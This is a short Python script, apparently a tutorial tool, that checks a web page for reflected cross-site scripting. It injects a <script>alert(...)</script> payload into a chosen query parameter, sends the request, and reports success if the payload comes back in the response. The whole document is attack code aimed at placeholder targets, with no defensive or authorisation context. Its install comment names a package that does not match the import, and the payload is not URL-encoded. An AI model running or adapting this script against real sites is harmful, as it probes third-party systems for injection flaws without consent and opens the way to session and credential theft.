#pip install python-requests
import requests

def perform_xss_attack(target_url, vulnerable_parameter, payload):
    attack_url = f"{target_url}?{vulnerable_parameter}={payload}"

    try:
        response = requests.get(attack_url)
        if payload in response.text:
            print(f"XSS attack successful! Payload: {payload}")
        else:
            print("XSS attack unsuccessful.")

    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_url = 'your_target_url'
    vulnerable_parameter = 'your_vulnerable_parameter'
    xss_payload = '<script>alert("XSS Attack");</script>'

    perform_xss_attack(target_url, vulnerable_parameter, xss_payload)
